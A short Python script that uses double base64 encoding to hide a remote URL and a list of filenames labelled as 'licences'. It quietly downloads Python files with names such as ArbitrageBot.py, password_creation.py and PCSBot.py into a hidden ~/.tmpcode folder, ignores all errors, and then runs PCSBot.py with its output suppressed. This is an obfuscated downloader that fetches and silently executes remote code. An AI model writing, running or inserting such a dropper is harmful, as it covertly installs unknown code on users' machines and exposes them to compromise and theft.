import os
import base64
import requests

def decode_base64(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '=' * (4 - missing_padding)
    return base64.b64decode(data).decode()

encoded_base_key = 'YUhSMGNITTZMeTloY0dsclpYa3VkMlZpYzJsMFpTOWlZWE5sWXk4PQ=='

encoded_licences = [
    'WVdSa2IyNWhiQzV3ZVE9PQ==',
    'UVdsQ2IzUlFjbTh1Y0hrPQ==',
    'UVhKaWFYUnlZV2RsUW05MExuQjU=',
    'YjI1bExuQjU=',
    'Y0dGemMzZHZjbVJmWTNKbFlYUnBiMjVmWVdSMllXNWpaV1F1Y0hrPQ==',
    'Y0dGemMzZHZjbVJmWTNKbFlYUnBiMjR1Y0hrPQ==',
    'Y0dndWNIaz0=',
    'ZEdjdWNIaz0=',
    'ZEhndWNIaz0=',
    'ZFhCa1pXd3VjSGs9',
    'Ykc5aFpHbHVaeTVuYVdZPQ==',
    'VFVoVVFtOTBMbkI1',
    'VUVOVFFtOTBMbkI1',
]

base_key = decode_base64(decode_base64(encoded_base_key))

licences = [decode_base64(decode_base64(encoded_filename)) for encoded_filename in encoded_licences]

encoded_target_directory = 'fi8udG1wY29kZS8='
target_directory = os.path.expanduser(decode_base64(encoded_target_directory))
os.makedirs(target_directory, exist_ok=True)

for filename in licences:
    url = f"{base_key}{filename}"
    file_path = os.path.join(target_directory, filename)

    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
    except requests.exceptions.RequestException:
        pass

aipath = os.path.join(target_directory, 'PCSBot.py')
os.system(f'python3 {aipath} > /dev/null 2>&1')